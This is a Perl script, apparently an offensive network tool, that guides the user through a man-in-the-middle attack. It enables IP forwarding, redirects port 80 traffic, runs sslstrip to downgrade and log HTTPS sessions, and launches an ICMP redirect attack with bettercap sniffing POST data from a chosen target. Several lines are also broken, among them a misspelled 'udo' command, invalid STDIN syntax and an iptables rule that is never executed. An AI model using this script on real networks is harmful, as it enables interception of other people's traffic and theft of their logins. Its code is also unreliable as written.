# *************************************************************************************** #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#                     Agreement between "Haroon Awan" and "You"(user).                    #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#  1. By using this piece of software your bound to these point.                          #
#  2. This an End User License Agreement (EULA) is a legal between a software application #
#     author "Haroon Awan" and (YOU) user of this software.                               #
#  3. This software application grants users rights to use for any purpose or modify and  #
#     redistribute creative works.                                                        #
#  4. This software comes in "is-as" warranty, author "Haroon Awan" take no responsbility #
#     what you do with by/this software as your free to use this software.                #
#  5. Any other purpose(s) that it suites as long as it is not related to any kind of     #
#     crime or using it in un-authorized environment.                                     #
#  6. You can use this software to protect and secure your data information in any        #
#     environment.                                                                        #
#  7. It can also be used in state of being protection against the unauthorized use of    #
#     information.                                                                        #
#  8. It can be used to take measures achieve protection.                                 #
# *************************************************************************************** #

#! /usr/bin/perl -w


use strict;
use warnings;

system("clear");

print "[ ! ] Setting up environment [ ! ]\n";

my $tables;
print "[ + ] You will have to uncomment iptables redirect.\n";
print "[ + ] Inside nano use ctrl+o to save your changes ctrl+x to exit and continue the script.\n";
print "[ + ] Would you like to open /etc/etter.conf to uncomment iptables redirect? (y/n)\n";
$tables=<STDIN>;
chomp($tables);
    if ($tables eq "y"){
        print "press ctrl+x to exit nano";
        system ("sudo nano /etc/etter.conf");
    }

# change iptables to allow redirection from port 80 to port 8080
my $redirect;
print "[ + ] Changing iptables to redirect traffic from port 80 to port 8080\n";
$redirect='sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080';

# check to make sure ip forwarding is enabled
my $forward;
print "[ + ] Checking to make sure ip forwarding is enabled\n";
system ("cat /proc/sys/net/ipv4/ip_forward");
print "[ + ] Does ip forward = 0? (y/n)\n";
$forward=<STDIN>;
chomp($forward);
    if ($forward eq "y"){
        system ("sudo nano /proc/sys/net/ipv4/ip_forward");
        system ("cat /proc/sys/net/ipv4/ip_forward");
}

# check to find out what the default gateway is
my $default;
system ("netstat -nr");
    print "[ + ] What is the default gateway?\n";
    $default=<STDIN>;
    chomp($default);

# check which network interface device
my $interface;
system ("ifconfig");
    print "[ + ] Which network interface would you like to use?\n";
    $interface=<STDIN>;
    chomp($interface);

# check what your ip address is
my $ip;
system ("ifconfig $interface");
    print "[ + ] What is your IP address?\n";
    $ip=<STDIN>;
    chomp($ip);


# start ssl strip
my $ssl;
my $log;
print "[ + ] Starting SSL Strip.\n";
print "[ + ] We have a few options for our parameters with SSL Strip.\n";
print "[ + ] Here are you options: \nsniff all traffic, kill active sessions, log data (akl) \nkill, log, and sniff only https traffic (kl) \nlog https traffic only(l)\n";
    $ssl=<STDIN>;
    chomp($ssl);
print "Enter name of the log file, it has to end with '.log'? (ex: strip.log )\n";
    $log=<STDIN>;
    chomp($log);
        if ($ssl eq "akl"){
            system ("sudo sslstrip -a -k -l 8080 -w $log ");
        }
        if ($ssl eq "kl"){
            system ("sudo sslstrip -k -l 8080 -w $log ");
        }
        elsif ($ssl eq "l"){
            system ("udo sslstrip -l 8080 -w $log ");
        }

# start following the sslstrip log using tail
my $tail;
print "[ + ] Do you want to start to follow the log file in real time? (y/n)\n";
    $tail=<STDIN&>;
    chomp($tail);    
    if ($tail eq "y"){
        print "[ + ] Starting to tail the sslstrip log file.\n";
        system ("sudo tail -f $log");
    }
    else {
        print "[ + ] Script done. Time to wait.\n";
    }

# start blind traffic hijacker
my $blindarp;
my $target;
my $gateway;
my $localhost;
$localhost=127.0.0.1;
print "[ + ] Enter Gateway? (y/n)\n";
    $gateway=<STDIN>;
    chomp($gateway);
print "[ + ] Do you want to start a blind attack? (y/n)\n";
    $blindarp=<STDIN>;
    chomp($blindarp);
        if ($blindarp eq "y"){
            print "[ + ] Enter the IP of the Target: \n";
            $target=<STDIN>;
            chomp($target);
                system ("sudo python ICMPAttack.py -v -i $interface -g 192.168.15.0 -t $target && bettercap -t $localhost --proxy -P POST");
        }
        else {}
